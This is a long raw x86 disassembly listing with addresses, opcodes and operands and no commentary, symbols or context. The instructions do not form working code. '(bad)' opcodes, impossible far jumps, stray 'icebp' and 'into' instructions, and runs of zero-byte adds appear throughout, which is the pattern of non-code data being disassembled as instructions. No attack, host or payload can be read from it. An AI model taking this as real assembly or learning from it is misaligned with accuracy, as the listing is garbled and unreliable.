  43a5c4:	fwait
  43a5c5:	push   cs
  43a5c6:	push   eax
  43a5c7:	mul    DWORD PTR [esi+0x4e]
  43a5ca:	push   cs
  43a5cb:	push   eax
  43a5cc:	fwait
  43a5cd:	addr16 call 0x204758ec
  43a5d3:	push   eax
  43a5d4:	das    
  43a5d5:	fwait
  43a5d6:	cmc    
  43a5d7:	adc    edx,edx
  43a5d9:	cmc    
  43a5da:	add    edx,DWORD PTR [eax+0x5c771b18]
  43a5e0:	into   
  43a5e1:	and    ebp,DWORD PTR [ebx+0x451d6cb7]
  43a5e7:	mov    ecx,0x58203c37
  43a5ec:	loop   0x43a5f0
  43a5ee:	inc    ebp
  43a5ef:	adc    DWORD PTR [edx-0x1a],0xffffffc3
  43a5f3:	lahf   
  43a5f4:	cs cmp ch,dh
  43a5f7:	adc    eax,DWORD PTR [edi-0x1e6ffc09]
  43a5fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a5fe:	jbe    0x43a5d4
  43a600:	into   
  43a601:	repz mov dl,0x0
  43a604:	add    BYTE PTR [eax],al
  43a606:	add    BYTE PTR [eax],al
  43a608:	or     dh,dh
  43a60a:	adc    edx,DWORD PTR [edi+eax*8]
  43a60d:	test   DWORD PTR [eax],ecx
  43a60f:	jg     0x43a661
  43a611:	mov    ch,0x72
  43a613:	pop    esi
  43a614:	addr16 test eax,edi
  43a617:	js     0x43a5ed
  43a619:	into   
  43a61a:	shl    DWORD PTR [esi-0x44],cl
  43a61d:	into   
  43a61e:	mov    edi,0x4ae09878
  43a623:	mov    al,0x73
  43a625:	repnz test DWORD PTR [ebx+0x1fd3e616],esi
  43a62c:	cmp    ebx,esp
  43a62e:	fwait
  43a62f:	jle    0x43a681
  43a631:	mov    ch,0x72
  43a633:	popf   
  43a634:	daa    
  43a635:	test   eax,edi
  43a637:	js     0x43a60d
  43a639:	into   
  43a63a:	adc    esi,DWORD PTR [edi-0x44]
  43a63d:	into   
  43a63e:	pop    es
  43a63f:	jns    0x43a5d9
  43a641:	loopne 0x43a68d
  43a643:	scas   eax,DWORD PTR es:[edi]
  43a644:	mov    bl,0xfa
  43a646:	add    eax,0xa8e18fda
  43a64b:	iret   
  43a64c:	mov    bl,0xfa
  43a64e:	push   cs
  43a64f:	mov    dh,0xdf
  43a651:	sar    BYTE PTR [esi],1
  43a653:	sbb    DWORD PTR [ebp-0xb],ecx
  43a656:	es ins BYTE PTR es:[edi],dx
  43a658:	push   ebx
  43a659:	mov    ebx,0xb2931b93
  43a65e:	push   cs
  43a65f:	push   0xffffffd7
  43a661:	rcl    BYTE PTR [edx-0x1b],1
  43a664:	mov    esp,0x93e84c2f
  43a669:	mov    dl,0x95
  43a66b:	and    eax,0x0
  43a670:	add    BYTE PTR [eax-0x3e],dh
  43a673:	fwait
  43a674:	sbb    eax,0xe195d270
  43a679:	loope  0x43a687
  43a67b:	psubsw mm6,QWORD PTR [ebx-0x4e]
  43a67f:	ds pop esi
  43a681:	loop   0x43a63f
  43a683:	xchg   ebx,eax
  43a684:	sub    DWORD PTR [ecx+esi*1-0x4d6c17b0],eax
  43a68b:	xchg   ebp,eax
  43a68c:	lods   eax,DWORD PTR ds:[esi]
  43a68d:	lahf   
  43a68e:	rcr    BYTE PTR [ebx-0x6a05686b],cl
  43a694:	loope  0x43a6b7
  43a696:	idiv   DWORD PTR [esi]
  43a698:	cs and dl,al
  43a69b:	xchg   ebx,eax
  43a69c:	sub    DWORD PTR [ecx+esi*1+0xa],esp
  43a6a0:	call   0xadd95938
  43a6a5:	scas   eax,DWORD PTR es:[edi]
  43a6a6:	rcr    BYTE PTR [ebx-0x6a25584b],cl
  43a6ac:	icebp  
  43a6ad:	add    edi,esi
  43a6af:	jmp    0x3f263e29
  43a6b4:	mul    cl
  43a6b6:	not    DWORD PTR [ebx+0xe311c29]
  43a6bc:	call   0x55d95954
  43a6c1:	sub    ah,cl
  43a6c3:	xchg   edi,eax
  43a6c4:	xor    eax,0xef27bff8
  43a6c9:	mov    ds:0xe900f730,al
  43a6ce:	scas   eax,DWORD PTR es:[edi]
  43a6cf:	push   cs
  43a6d0:	mov    edx,edx
  43a6d2:	xor    eax,0x244b
  43a6d7:	add    BYTE PTR [eax],al
  43a6d9:	add    BYTE PTR [ebp-0xec8b97b],dl
  43a6df:	mov    al,ds:0xafe9aa8c
  43a6e4:	push   cs
  43a6e5:	mov    ebp,DWORD PTR [edx]
  43a6e7:	ss push ebx
  43a6e9:	and    al,0xc5
  43a6eb:	xor    al,0x7b
  43a6ed:	aaa    
  43a6ee:	in     eax,0xac
  43a6f0:	test   BYTE PTR [eax-0x74e4658b],0x6c
  43a6f7:	scas   al,BYTE PTR es:[edi]
  43a6f8:	xor    eax,0x1eacb91e
  43a6fd:	je     0x43a6da
  43a6ff:	ja     0x43a75e
  43a701:	jno    0x43a6c6
  43a703:	outs   dx,DWORD PTR ds:[esi]
  43a704:	out    0x75,eax
  43a706:	mov    eax,ds:0x8aa7fdf0
  43a70b:	outs   dx,DWORD PTR ds:[esi]
  43a70c:	jmp    0x1c8b:0x4c4ab984
  43a713:	mov    bh,0x70
  43a715:	jmp    esp
  43a717:	bound  ebp,QWORD PTR [esi]
  43a719:	sbb    al,0xd1
  43a71b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a71c:	dec    ebp
  43a71d:	std    
  43a71e:	mov    dh,0xd3
  43a720:	and    al,0x6a
  43a722:	sub    eax,esi
  43a724:	pop    ebp
  43a725:	or     BYTE PTR [esi-0x57],dh
  43a728:	mov    dl,BYTE PTR [ebx]
  43a72a:	stc    
  43a72b:	scas   al,BYTE PTR es:[edi]
  43a72c:	(bad)  
  43a72d:	rcr    BYTE PTR ds:0x4155936c,0x5c
  43a734:	je     0x43a735
  43a736:	cli    
  43a737:	cmc    
  43a738:	neg    BYTE PTR [eax]
  43a73a:	mov    cl,0xf1
  43a73c:	out    0x8b,eax
  43a73e:	add    BYTE PTR [eax],al
  43a740:	add    BYTE PTR [eax],al
  43a742:	add    BYTE PTR [ecx+0x1874f639],dl
  43a748:	push   ebp
  43a749:	out    0x8b,eax
  43a74b:	fsub   QWORD PTR [ecx]
  43a74d:	pop    ebx
  43a74e:	and    al,0x90
  43a750:	jge    0x43a788
  43a752:	loope  0x43a7a0
  43a754:	jbe    0x43a7a3
  43a756:	mov    BYTE PTR [ebp+esi*4+0x1],dl
  43a75a:	test   ebp,eax
  43a75c:	pusha  
  43a75d:	sbb    al,0x19
  43a75f:	out    dx,eax
  43a760:	cmp    ebx,DWORD PTR [esp+eax*2-0x3f6d9754]
  43a767:	mov    DWORD PTR fs:[esi+edi*8+0x4077f519],edi
  43a76f:	nop
  43a770:	push   cs
  43a771:	fisub  DWORD PTR [ebx]
  43a773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a774:	xor    DWORD PTR [edx+0x44],edx
  43a777:	mov    ebp,0x6c44992b
  43a77c:	jne    0x43a70f
  43a77e:	inc    esp
  43a77f:	je     0x43a7de
  43a781:	(bad)  
  43a782:	aas    
  43a783:	imul   ecx,ebp,0xffffffe5
  43a786:	pop    es
  43a787:	or     DWORD PTR [ebp-0xe],edx
  43a78a:	sub    ecx,DWORD PTR [ebx]
  43a78c:	dec    ebp
  43a78d:	repnz sbb ebx,DWORD PTR [edi-0x780735f3]
  43a794:	icebp  
  43a795:	cwde   
  43a796:	inc    esp
  43a797:	mov    ah,0x5f
  43a799:	dec    ebp
  43a79a:	je     0x43a75b
  43a79c:	(bad)  
  43a79d:	cdq    
  43a79e:	or     al,al
  43a7a0:	enter  0x17c2,0x1b
  43a7a4:	pop    eax
  43a7a5:	repnz xor eax,DWORD PTR [eax]
  43a7a8:	add    BYTE PTR [eax],al
  43a7aa:	add    BYTE PTR [eax],al
  43a7ac:	or     esp,DWORD PTR [eax]
  43a7ae:	repnz daa 
  43a7b0:	ror    BYTE PTR [edx*2-0xdafe6f4],1
  43a7b7:	xor    ecx,DWORD PTR [ebx+0x727dfd99]
  43a7bd:	mov    eax,0x200bf94c
  43a7c2:	repnz pop ss
  43a7c4:	sbb    edi,DWORD PTR [eax]
  43a7c6:	repnz aas 
  43a7c8:	sbb    ebx,DWORD PTR [eax-0xe]
  43a7cb:	adc    eax,esi
  43a7cd:	mov    dl,0x5c
  43a7cf:	or     al,0xc0
  43a7d1:	and    DWORD PTR [edi],0x1bf7151c
  43a7d7:	in     al,0x57
  43a7d9:	sub    eax,0xaa4f40f0
  43a7de:	pop    esp
  43a7df:	enter  0xc2b3,0x7
  43a7e3:	lea    ebx,[eax+0xd0c0781]
  43a7e9:	not    DWORD PTR [ebx]
  43a7eb:	sbb    cl,bl
  43a7ed:	push   es
  43a7ee:	fdiv   st(3),st
  43a7f0:	or     al,0xab
  43a7f2:	daa    
  43a7f3:	inc    ecx
  43a7f4:	pop    edi
  43a7f5:	call   0x8d27:0xd673c86c
  43a7fc:	mov    al,ds:0xd0c0681
  43a801:	not    ebx
  43a803:	pop    ss
  43a804:	inc    eax
  43a805:	sub    eax,0xaa5640c8
  43a80a:	push   es
  43a80b:	scas   al,BYTE PTR es:[edi]
  43a80c:	and    al,0xdc
  43a80e:	pop    esp
  43a80f:	dec    ebp
  43a810:	add    BYTE PTR [eax],al
  43a812:	add    BYTE PTR [eax],al
  43a814:	add    BYTE PTR [eax-0x76bea74e],ch
  43a81a:	out    0x40,eax
  43a81c:	pop    ss
  43a81d:	inc    esp
  43a81e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a81f:	mov    bh,0x3
  43a821:	fchs   
  43a823:	mov    dl,0xdc
  43a825:	div    BYTE PTR [esi+0x7c]
  43a828:	push   es
  43a829:	nop
  43a82a:	mov    dl,0x34
  43a82c:	xlat   BYTE PTR ds:[ebx]
  43a82d:	or     al,0x8e
  43a82f:	ja     0x43a861
  43a831:	sbb    al,0xb3
  43a833:	test   DWORD PTR [ebx],0xc3e1221e
  43a839:	dec    edi
  43a83a:	in     al,0xa9
  43a83c:	fdivr  st,st(6)
  43a83e:	inc    ecx
  43a83f:	loope  0x43a804
  43a841:	aas    
  43a842:	cdq    
  43a843:	jmp    0x1334:0x5d813b52
  43a84a:	mov    BYTE PTR [edi],cl
  43a84c:	out    0xf,al
  43a84e:	add    eax,0x1893e910
  43a853:	push   0x74
  43a855:	imul   ecx,DWORD PTR ds:[eax-0x2f],0xd6e9f98f
  43a85d:	push   ss
  43a85e:	in     eax,0xf6
  43a860:	nop
  43a861:	adc    esi,DWORD PTR [edx+0x4babe90e]
  43a867:	pop    eax
  43a868:	mov    esi,0x64113750
  43a86d:	(bad)  
  43a86e:	cwde   
  43a86f:	inc    eax
  43a870:	pop    esp
  43a871:	into   
  43a872:	push   0xe450da40
  43a877:	xchg   edi,eax
  43a878:	sbb    al,0x0
  43a87a:	add    BYTE PTR [eax],al
  43a87c:	add    BYTE PTR [eax],al
  43a87e:	mov    WORD PTR [ebx+0x3f],?
  43a881:	in     eax,0xe
  43a883:	jb     0x43a89f
  43a885:	fs ret 0xea7f
  43a889:	jmp    0x2cdf5c92
  43a88e:	push   eax
  43a88f:	icebp  
  43a890:	inc    eax
  43a891:	jbe    0x43a856
  43a893:	mov    al,ds:0x3580a993
  43a898:	or     ch,al
  43a89a:	xchg   ebx,eax
  43a89b:	mov    dl,0x9b
  43a89d:	je     0x43a8ea
  43a89f:	jnp    0x43a88b
  43a8a1:	push   esi
  43a8a2:	or     al,BYTE PTR [eax]
  43a8a4:	psubsw mm2,QWORD PTR [ebx-0x2f4fa276]
  43a8ab:	jns    0x43a843
  43a8ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a8ae:	scas   eax,DWORD PTR es:[edi]
  43a8af:	loop   0x43a846
  43a8b1:	loope  0x43a883
  43a8b3:	out    dx,eax
  43a8b4:	sbb    ah,BYTE PTR [edx+0x56]
  43a8b7:	jl     0x43a8f8
  43a8b9:	jb     0x43a846
  43a8bb:	jns    0x43a8fd
  43a8bd:	stc    
  43a8be:	push   ss
  43a8bf:	jae    0x43a8db
  43a8c1:	ins    BYTE PTR es:[edi],dx
  43a8c2:	ja     0x43a876
  43a8c4:	push   cs
  43a8c5:	jmp    0x12e9cd6
  43a8ca:	mov    esp,0x218bfa68
  43a8cf:	pop    dx
  43a8d1:	dec    DWORD PTR [eax]
  43a8d3:	test   al,0x8d
  43a8d5:	sar    BYTE PTR [esi],0x39
  43a8d8:	lods   al,BYTE PTR ds:[esi]
  43a8d9:	add    BYTE PTR [ecx],ch
  43a8db:	mov    ah,0x93
  43a8dd:	inc    ebp
  43a8de:	jmp    0x137e704
  43a8e3:	add    BYTE PTR [eax],al
  43a8e5:	add    BYTE PTR [eax],al
  43a8e7:	jb     0x43a897
  43a8e9:	pop    eax
  43a8ea:	push   0x4ea809
  43a8ef:	cdq    
  43a8f0:	mov    edi,0xb0398519
  43a8f5:	lea    esp,[ecx-0x4cf14c07]
  43a8fb:	call   0x9a0745b0
  43a900:	and    DWORD PTR [esi-0x183fd188],ecx
  43a906:	push   eax
  43a907:	sub    al,0x29
  43a909:	(bad)  
  43a90a:	dec    BYTE PTR [esi]
  43a90c:	shl    BYTE PTR [eax+0x34],0x99
  43a910:	into   
  43a911:	pop    eax
  43a912:	dec    ebx
  43a913:	sub    al,0xbf
  43a915:	imul   eax,esp,0xffffffc9
  43a918:	sub    cl,bh
  43a91a:	jle    0x43a8c3
  43a91c:	sub    al,0x4e
  43a91e:	hlt    
  43a91f:	sbb    al,0x59
  43a921:	not    BYTE PTR [edx+0x63]
  43a924:	push   edi
  43a925:	xchg   ebp,eax
  43a926:	xchg   ebp,eax
  43a927:	xor    DWORD PTR [ebp+0x683bffe7],edi
  43a92d:	xchg   ebp,eax
  43a92e:	xchg   ebp,eax
  43a92f:	pop    ecx
  43a930:	shl    bh,0xff
  43a933:	mov    dh,0x69
  43a935:	mul    BYTE PTR [ecx+edi*2-0x4d]
  43a939:	push   cs
  43a93a:	mov    esi,DWORD PTR [ecx+0x61]
  43a93d:	pop    edx
  43a93e:	call   FWORD PTR [eax]
  43a940:	scas   eax,DWORD PTR es:[edi]
  43a941:	(bad)  
  43a942:	shl    BYTE PTR [ebx+edi*2],0x74
  43a946:	inc    eax
  43a947:	nop
  43a948:	push   ss
  43a949:	cwde   
  43a94a:	dec    eax
  43a94b:	add    BYTE PTR [eax],al
  43a94d:	add    BYTE PTR [eax],al
  43a94f:	add    BYTE PTR [esi],bh
  43a951:	mov    al,0x29
  43a953:	push   eax
  43a954:	aaa    
  43a955:	pop    esi
  43a956:	jbe    0x43a965
  43a958:	ror    BYTE PTR [ecx+0x789cc097],1
  43a95e:	mov    eax,0xdae60df8
  43a963:	stc    
  43a964:	pop    ss
  43a965:	cwde   
  43a966:	jg     0x43a9b3
  43a968:	or     BYTE PTR [ecx+0x3a],ah
  43a96b:	ds add eax,0x84c09268
  43a971:	test   BYTE PTR [eax+0x742539fe],bh
  43a977:	inc    eax
  43a978:	nop
  43a979:	push   cs
  43a97a:	mov    edi,0xd021f8f7
  43a97f:	cli    
  43a980:	fbstp  TBYTE PTR [ebx+0x18]
  43a983:	jge    0x43a95d
  43a985:	shl    BYTE PTR [esi+0x13511302],cl
  43a98b:	jae    0x43a928
  43a98d:	daa    
  43a98e:	dec    ebp
  43a98f:	cmp    BYTE PTR [ebx+0x2a8219b4],0x38
  43a996:	sub    ecx,edi
  43a998:	sbb    edx,esi
  43a99a:	es push eax
  43a99c:	sbb    edx,DWORD PTR [ecx+0x14884f29]
  43a9a2:	xlat   BYTE PTR ds:[ebx]
  43a9a3:	out    dx,eax
  43a9a4:	inc    eax
  43a9a5:	add    al,0x16
  43a9a7:	stc    
  43a9a8:	loope  0x43a92d
  43a9aa:	xchg   ebp,eax
  43a9ab:	inc    ebx
  43a9ac:	test   BYTE PTR [edx*4-0x1c480f8],bh
  43a9b3:	add    BYTE PTR [eax],0x0
  43a9b6:	add    BYTE PTR [eax],al
  43a9b8:	add    BYTE PTR [eax-0x7b],dl
  43a9bb:	xchg   edx,eax
  43a9bc:	adc    DWORD PTR [edi-0x43],ebp
  43a9bf:	sub    BYTE PTR [ebp+0x4394c3e5],al
  43a9c5:	pop    esp
  43a9c6:	sbb    al,0x95
  43a9c8:	adc    BYTE PTR [edi-0x4d],dl
  43a9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a9cc:	or     edx,DWORD PTR ds:0xe03ea1b5
  43a9d2:	stos   BYTE PTR es:[edi],al
  43a9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a9d4:	test   eax,0x4e6cd8b9
  43a9d9:	sub    bh,ah
  43a9db:	add    bh,BYTE PTR [esi]
  43a9dd:	sub    esi,ebx
  43a9df:	mov    edx,ebx
  43a9e1:	dec    esi
  43a9e2:	jb     0x43a96f
  43a9e4:	mov    ch,BYTE PTR [edx+esi*1]
  43a9e7:	adc    al,0x3b
  43a9e9:	sub    BYTE PTR [ebx],al
  43a9eb:	jns    0x43aa2c
  43a9ed:	or     DWORD PTR [edi-0x3f664e0d],edi
  43a9f3:	scas   al,BYTE PTR es:[edi]
  43a9f4:	sub    al,0xe
  43a9f6:	jns    0x43a9d1
  43a9f8:	cmp    eax,0x3dd1f4e8
  43a9fd:	jmp    0xb96f888b
  43aa02:	and    DWORD PTR [ecx-0x62b217c3],0x818ad93d
  43aa0c:	xor    al,0xc9
  43aa0e:	jge    0x43aa57
  43aa10:	add    edi,DWORD PTR [eax-0x46c281f9]
  43aa16:	sub    DWORD PTR [ebx-0x60c80b21],edx
  43aa1c:	mov    eax,0x0
  43aa21:	add    BYTE PTR [edx-0x53],dh
  43aa24:	and    BYTE PTR [ebx],al
  43aa26:	xor    dh,BYTE PTR [edi]
  43aa28:	mov    eax,0x60317ab8
  43aa2d:	hlt    
  43aa2e:	and    ah,BYTE PTR [ecx-0x4f308b20]
  43aa34:	je     0x43aa72
  43aa36:	or     BYTE PTR [edi],al
  43aa38:	sti    
  43aa39:	cmp    BYTE PTR [eax-0x26],0xc2
  43aa3d:	push   es
  43aa3e:	outs   dx,DWORD PTR ds:[esi]
  43aa3f:	scas   al,BYTE PTR es:[edi]
  43aa40:	arpl   WORD PTR ds:0x3f18b69,di
  43aa46:	nop
  43aa47:	mov    dl,0xe
  43aa49:	push   0x72
  43aa4b:	jge    0x43aac5
  43aa4d:	loope  0x43aa8a
  43aa4f:	ds ds jb 0x43aa3d
  43aa53:	xor    eax,ebx
  43aa55:	xchg   ebp,eax
  43aa56:	fs stos BYTE PTR es:[edi],al
  43aa58:	mov    eax,ds:0xcf2ff5e8
  43aa5d:	xchg   ebp,eax
  43aa5e:	pop    esp
  43aa5f:	jecxz  0x43aaa2
  43aa61:	mov    edx,0x720d1465
  43aa66:	data16 in al,0x8d
  43aa69:	icebp  
  43aa6a:	add    BYTE PTR cs:[ebx],dl
  43aa6d:	bound  ebx,QWORD PTR [edx-0x69]
  43aa70:	adc    al,0x6a
  43aa72:	retf   
  43aa73:	xlat   BYTE PTR ds:[ebx]
  43aa74:	arpl   bx,bp
  43aa76:	nop
  43aa77:	je     0x43aabd
  43aa79:	inc    ebx
  43aa7a:	add    al,0xd8
  43aa7c:	cmc    
  43aa7d:	cli    
  43aa7e:	sub    eax,0x2500e6fe
  43aa83:	mov    al,ds:0xb775
  43aa88:	add    BYTE PTR [eax],al
  43aa8a:	add    BYTE PTR [ecx+0x10a9a1ab],bl
  43aa90:	jb     0x43aa51
  43aa92:	jmp    0x7d44:0xf6d87fa3
  43aa99:	je     0x43aa7d
  43aa9b:	dec    esi
  43aa9c:	pmuludq mm6,QWORD PTR [esi+esi*8]
  43aaa0:	das    
  43aaa1:	iret   
  43aaa2:	adc    eax,0xe8d9ff91
  43aaa7:	sbb    BYTE PTR [eax-0x6a],ch
  43aaaa:	xchg   esi,eax
  43aaab:	pop    esp
  43aaac:	gs (bad) 
  43aaae:	mov    edx,DWORD PTR [ecx+0x87853ab]
  43aab4:	jae    0x43ab00
  43aab6:	jo     0x43aa38
  43aab8:	fiadd  DWORD PTR [ebp+0x2a]
  43aabb:	adc    BYTE PTR [esi-0x25743cf2],bl
  43aac1:	inc    ebp
  43aac2:	sub    ah,BYTE PTR [eax-0x1f]
  43aac5:	inc    eax
  43aac6:	add    BYTE PTR [esi],cl
  43aac8:	sub    edi,edx
  43aaca:	call   0x525abc
  43aacf:	repnz cmp ebp,DWORD PTR [esi]
  43aad2:	adc    al,0x5a
  43aad4:	int    0x93
  43aad6:	fnstsw WORD PTR [esi+edi*4+0x11a1075d]
  43aadd:	adc    eax,DWORD PTR [eax]
  43aadf:	sub    DWORD PTR [ebx],ebp
  43aae1:	(bad)  
  43aae2:	push   ebp
  43aae3:	cld    
  43aae4:	fs out 0x74,eax
  43aae7:	pop    ebp
  43aae8:	mov    WORD PTR [ebp-0x1c8bc901],cs
  43aaee:	push   edi
  43aaef:	add    BYTE PTR [eax],al
  43aaf1:	add    BYTE PTR [eax],al
  43aaf3:	add    BYTE PTR [esi],ah
  43aaf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43aaf6:	mov    dl,0x15
  43aaf8:	jmp    0x810f3eac
  43aafd:	mov    al,0xf6
  43aaff:	pushf  
  43ab00:	xchg   edx,eax
  43ab01:	mov    bh,0xe7
  43ab03:	cmp    DWORD PTR [edi+0x29320e41],edx
  43ab09:	int3   
  43ab0a:	dec    esp
  43ab0b:	push   0xfffffffd
  43ab0d:	clc    
  43ab0e:	test   BYTE PTR [ecx+0x6a43b6b9],0xed
  43ab15:	sub    dl,BYTE PTR [eax+0x4]
  43ab18:	jns    0x43aad1
  43ab1a:	pop    ds
  43ab1b:	(bad)  
  43ab1c:	out    dx,eax
  43ab1d:	mov    eax,0x6fbcb3fd
  43ab22:	jmp    0x1375:0x53aea68c
  43ab29:	bound  edi,QWORD PTR ds:0x3d62ba6a
  43ab2f:	call   FWORD PTR [ebp-0x6200c5a5]
  43ab35:	pop    ebx
  43ab36:	cmp    bh,bh
  43ab38:	fistp  QWORD PTR [eax+0x6f8cbbfd]
  43ab3e:	jmp    0x90c0:0x8d7b2f88
  43ab45:	pop    esi
  43ab46:	sbb    eax,DWORD PTR [ebp+0x19f146]
  43ab4c:	nop
  43ab4d:	mov    DWORD PTR [ecx],edi
  43ab4f:	mov    eax,0x59c58a20
  43ab54:	mov    ebp,0x105420
  43ab59:	add    BYTE PTR [eax],al
  43ab5b:	add    BYTE PTR [eax],al
  43ab5d:	nop
  43ab5e:	and    ebx,DWORD PTR [ecx+0xe6e38ef]
  43ab64:	add    BYTE PTR [eax-0x6ffc5af8],dl
  43ab6a:	sbb    eax,0x95bef917
  43ab6f:	and    eax,0xce5df013
  43ab74:	call   DWORD PTR [edx]
  43ab76:	xor    ebp,edx
  43ab78:	call   DWORD PTR [edx]
  43ab7a:	inc    ebx
  43ab7b:	push   cs
  43ab7c:	je     0x43ab09
  43ab7e:	mov    eax,fs
  43ab80:	clc    
  43ab81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ab82:	sub    edi,edi
  43ab84:	aas    
  43ab85:	nop
  43ab86:	or     al,dh
  43ab88:	call   FWORD PTR [ebp+0x48]
  43ab8b:	rol    BYTE PTR [ecx+eax*1-0x6ff857f8],0xbd
  43ab93:	pop    ss
  43ab94:	stc    
  43ab95:	pop    esi
  43ab96:	and    DWORD PTR ds:0xce5e3013,0x1af312ff
  43aba0:	add    BYTE PTR [esi+0x48],ch
  43aba3:	xchg   ebx,eax
  43aba4:	in     al,dx
  43aba5:	test   al,0x8a
  43aba7:	push   cs
  43aba8:	add    al,bh
  43abaa:	mov    BYTE PTR ds:0x99b80c4c,ah
  43abb0:	pushf  
  43abb1:	je     0x43ac24
  43abb3:	adc    eax,DWORD PTR [eax]
  43abb5:	nop
  43abb6:	mov    ds:0x86b37cbd,eax
  43abbb:	add    BYTE PTR gs:[edi+0x96a5c],dl
  43abc2:	add    BYTE PTR [eax],al
  43abc4:	add    BYTE PTR [eax],al
  43abc6:	aad    0xb2
  43abc8:	outs   dx,DWORD PTR ds:[esi]
  43abc9:	xor    DWORD PTR [edi+ecx*8],ecx
  43abcc:	mov    bh,0x4
  43abce:	nop
  43abcf:	mov    dl,0xfb
  43abd1:	mov    fs,WORD PTR [edi-0x1]
  43abd4:	icebp  
  43abd5:	test   BYTE PTR [ecx-0x4d],bl
  43abd8:	test   DWORD PTR [ebx+0x3a678a90],0x7f2a7a59
  43abe2:	lods   al,BYTE PTR ds:[esi]
  43abe3:	repnz test BYTE PTR [ebx],0x90
  43abe7:	mov    bl,0x7d
  43abe9:	add    esp,ecx
  43abeb:	or     ah,BYTE PTR [eax+0xb2d3a1]
  43abf1:	outs   dx,DWORD PTR ds:[esi]
  43abf2:	ins    BYTE PTR es:[edi],dx
  43abf3:	mov    edx,0x3b9003f6
  43abf8:	cwde   
  43abf9:	xchg   eax,edx
  43abfb:	mov    dl,0x7f
  43abfd:	out    dx,eax
  43abfe:	lock repnz idiv DWORD PTR [edx]
  43ac02:	fmul   st(6),st
  43ac04:	mov    ebx,0xafb29004
  43ac09:	test   al,0x1b
  43ac0b:	repz test DWORD PTR [eax],0x39287354
  43ac12:	sub    BYTE PTR [esi-0x5fdff028],0x37
  43ac19:	add    al,0xf
  43ac1b:	icebp  
  43ac1c:	fistp  QWORD PTR [esi-0x30]
  43ac1f:	(bad)  
  43ac20:	clc    
  43ac21:	cmc    
  43ac22:	pop    ss
  43ac23:	mov    WORD PTR [ebp+0x2ab29002],?
  43ac29:	scas   al,BYTE PTR es:[edi]
  43ac2a:	add    BYTE PTR [eax],al
  43ac2c:	add    BYTE PTR [eax],al
  43ac2e:	add    BYTE PTR [ebx-0x5c1fc3d9],dl
  43ac34:	jecxz  0x43ac43
  43ac36:	mov    DWORD PTR [edi+0x71],0xb38fe034
  43ac3d:	test   DWORD PTR [ebx],0x6fc37990
  43ac43:	xor    edx,0xe
  43ac46:	jmp    0x6cd771b6
  43ac4b:	leave  
  43ac4c:	das    
  43ac4d:	sub    al,0x95
  43ac4f:	xchg   edi,eax
  43ac50:	repnz push cs
  43ac52:	pushf  
  43ac53:	xchg   esp,eax
  43ac54:	mov    dl,0xe
  43ac56:	mov    DWORD PTR [eax-0x4b],edi
  43ac59:	arpl   ax,sp
  43ac5b:	mov    ebx,0xa9449415
  43ac60:	cs iret 
  43ac62:	mov    ch,0x19
  43ac64:	sub    al,0x53
  43ac66:	or     eax,0xa59be27c
  43ac6b:	outs   dx,DWORD PTR ds:[esi]
  43ac6c:	sar    BYTE PTR [esi],1
  43ac6e:	cs push eax
  43ac70:	aad    0x6
  43ac72:	jmp    0x16525f09
  43ac77:	xchg   esi,edi
  43ac79:	std    
  43ac7a:	test   al,0x93
  43ac7c:	xor    eax,0x40ed7ccf
  43ac81:	jmp    0x37ad:0x27b293e9
  43ac88:	test   eax,0xd54fab19
  43ac8d:	(bad)  
  43ac8e:	scas   al,BYTE PTR es:[edi]
  43ac8f:	inc    edi
  43ac90:	mov    ch,0x33
  43ac92:	jmp    0x43ac97
  43ac97:	add    BYTE PTR [esi],dl
  43ac99:	out    dx,al
  43ac9a:	xor    cl,BYTE PTR [esp+ebx*8]
  43ac9d:	jns    0x43aca3
  43ac9f:	cmp    eax,0x700ef286
  43aca4:	daa    
  43aca5:	aad    0xfe
  43aca7:	arpl   WORD PTR [ebx-0x2],dx
  43acaa:	sub    al,BYTE PTR [ebx-0x7d]
  43acad:	sub    eax,0xaac0553
  43acb2:	dec    edi
  43acb3:	dec    esi
  43acb4:	sar    DWORD PTR [eax+0x5a],cl
  43acb7:	sahf   
  43acb8:	mov    ss,esi
  43acba:	add    BYTE PTR [ecx],ch
  43acbc:	mov    WORD PTR [edi],gs
  43acbe:	push   ebx
  43acbf:	lds    eax,FWORD PTR [edi-0x62ff2d09]
  43acc5:	das    
  43acc6:	push   ebx
  43acc7:	add    al,0xd4
  43acc9:	dec    esp
  43acca:	mov    ds:0x3eae6988,al
  43accf:	jmp    DWORD PTR [eax+esi*8+0x18]
  43acd3:	inc    eax
  43acd4:	jns    0x43acfd
  43acd6:	push   ebx
  43acd7:	and    al,0x79
  43acd9:	imul   ebp,DWORD PTR [ebx-0x40],0x4495647a
  43ace0:	xchg   ebp,eax
  43ace1:	call   0xd7e7:0xac27ff3e
  43ace8:	jmp    0xeb4:0x683432ff
  43acef:	add    BYTE PTR ds:0xe5ff3d9d,al
  43acf5:	push   edi
  43acf6:	add    DWORD PTR es:[ecx],ebp
  43acf9:	mov    ah,0xe7
  43acfb:	mov    ah,0x0
  43acfd:	add    BYTE PTR [eax],al
  43acff:	add    BYTE PTR [eax],al
  43ad01:	inc    ebp
  43ad02:	sub    cl,0xff
  43ad05:	cmp    DWORD PTR [ebx-0x1d71f7a4],edi
  43ad0b:	imul   edi,eax,0x28
  43ad0e:	dec    ecx
  43ad0f:	and    al,0x85
  43ad11:	or     BYTE PTR [eax+0x1c],0x55
  43ad15:	adc    ebx,DWORD PTR [edi+0x6f165476]
  43ad1b:	jmp    0x6ad7:0xe7a667fe
  43ad22:	mov    dh,0xe9
  43ad24:	je     0x43acbb
  43ad26:	mov    edi,0xadb924a2
  43ad2b:	push   cs
  43ad2c:	add    BYTE PTR [esi],bl
  43ad2e:	add    esi,DWORD PTR [ebx]
  43ad30:	inc    eax
  43ad31:	call   0xb9adbbe9
  43ad36:	dec    ecx
  43ad37:	jmp    0x6115:0xe7a6a7fe
  43ad3e:	mov    eax,ds:0xc90004e
  43ad43:	sub    edi,edi
  43ad45:	and    al,0x8d
  43ad47:	cwde   
  43ad48:	sar    BYTE PTR [ebx-0x57356a7e],0x9a
  43ad4f:	and    cl,bh
